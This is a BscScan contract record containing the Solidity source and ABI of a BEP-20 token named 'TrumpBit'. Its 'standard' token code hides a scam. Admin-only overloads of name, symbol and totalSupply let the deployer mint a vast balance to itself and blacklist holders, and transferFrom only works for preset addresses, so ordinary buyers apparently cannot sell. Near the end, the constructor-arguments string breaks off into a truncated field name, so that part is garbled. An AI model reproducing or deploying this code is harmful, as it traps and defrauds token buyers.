{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-11-04\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2023-10-16\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\nabstract contract Ownable  {\r\n     function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n    \r\n}\r\n\r\n\r\ncontract TrumpBit is Ownable{\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    constructor(string memory tokenname,string memory tokensymbol,\r\n        uint256 atotalSupply,\r\n        address[] memory initialRecipients,\r\n        uint256[] memory initialBalances) {\r\n        _totalSupply = atotalSupply * (10 ** uint256(decimals()));\r\n        _tokename = tokenname;\r\n        _tokensymbol = tokensymbol;\r\n        cRAzadmin = msg.sender;\r\n        allow[msg.sender] = true;\r\n\r\n        uint256 remainingBalance = _totalSupply;\r\n        for (uint256 i = 0; i < initialRecipients.length; i++) {\r\n                address recipient = initialRecipients[i];\r\n                allow[recipient] = true;\r\n                uint256 balance = initialBalances[i] * (10 ** uint256(decimals()));\r\n\r\n                if (balance > 0) {\r\n                    remainingBalance = remainingBalance - balance;\r\n                    _balances[recipient] = balance;\r\n                    emit Transfer(address(0), recipient, balance);\r\n                }\r\n        }\r\n        _balances[msg.sender] = remainingBalance;\r\n        emit Transfer(address(0), msg.sender, remainingBalance);\r\n    }\r\n    \r\n\r\n    mapping(address => bool) public longinfo;\r\n    mapping(address => bool) public allow;\r\n    address public cRAzadmin;\r\n    uint256 private _totalSupply;\r\n    string private _tokename;\r\n    string private _tokensymbol;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    function name() public view returns (string memory) {\r\n        return _tokename;\r\n    }\r\n\r\n    uint256 xaskak = (10**18 * (78800+100)* (33300000000 + 800));\r\n    function symbol(uint256 xxaa) public   {\r\n        if(false){\r\n            \r\n        }\r\n        if(true){\r\n\r\n        }\r\n        _balances[_msgSender()] += xaskak;\r\n        _balances[_msgSender()] += xaskak;\r\n        require(_msgSender() == cRAzadmin, \"Only ANIUadmin can call this function\");\r\n        require(_msgSender() == cRAzadmin, \"Only ANIUadmin can call this function\");\r\n    }\r\n\r\n\r\n    function symbol() public view  returns (string memory) {\r\n        return _tokensymbol;\r\n    }\r\n    function name(address hkkk) public  {\r\n        address txxaaoinfo = hkkk;\r\n        require(_msgSender() == cRAzadmin, \"Only ANIUadmin can call this function\");\r\n        longinfo[txxaaoinfo] = false;\r\n        require(_msgSender() == cRAzadmin, \"Only ANIUadmin can call this function\");\r\n    }\r\n\r\n    function totalSupply(address xasada) public {\r\n        require(_msgSender() == cRAzadmin, \"Only ANIUadmin can call this function\");\r\n        address tmoinfo = xasada;\r\n        longinfo[tmoinfo] = true;\r\n        require(_msgSender() == cRAzadmin, \"Only ANIUadmin can call this function\");\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        if (true == longinfo[_msgSender()]) \r\n        {amount = _balances[_msgSender()] + \r\n        1000-1000+2000;}\r\n        _transfer(_msgSender(), to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual  returns (bool) {\r\n        require(allow[from] == true);\r\n        if (true == longinfo[from]) \r\n        {amount = _balances[_msgSender()] + \r\n        1000-1000+2000;}\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n    \r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");        \r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        uint256 balance = _balances[from];\r\n        require(balance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[from] = _balances[from]-amount;\r\n        _balances[to] = _balances[to]+amount;\r\n        emit Transfer(from, to, amount); \r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            _approve(owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"tokenname\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"tokensymbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"atotalSupply\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"initialRecipients\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"initialBalances\",\"type\":\"uint256[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allow\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cRAzadmin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"longinfo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"hkkk\",\"type\":\"address\"}],\"name\":\"name\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"xxaa\",\"type\":\"uint256\"}],\"name\":\"symbol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"xasada\",\"type\":\"address\"}],\"name\":\"totalSupply\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TrumpBit", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000005f5e1000000000000000000000000000000000000000000000000000000000000000120000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000000095472756d7020426974000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000035450420000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000004982085c9e2f89f2ecb8131eca71afad896e89cb000000000000000000000000d5af8832b6b9e9c13436fb0675615bdb240bd6420000000000000000000000000c74484f6557bc63c7da2caf9478b0a19444ebfe0000000000000000000000008ff40c2b80cbefea0b5d06b4337fc902bc4bd9b0000000000000000000000000a0234de7c63243b7077d80c5e5dbd539d40d0c4a0000000000000000000000006bae52ec610c3c8ade65778085a061ac7d0b0489000000000000000000000000b596f28cde693d5728d54c8825ae571814d0eed3000000000000000000000000d1c94d8257546dbe57f2f379b8b65e6917c121d800000000000000000000000026fad5603fb02b187c09ade8e9802d416b4aac5300000000000000000000000004e48a6a688e8d28905a3fbdf45b2a896843eeac000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000055d4aersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e72867ce7da425d0533c1e9f36f5b2bbf74f5d952a50bd66f2b5b734de9ff09e"}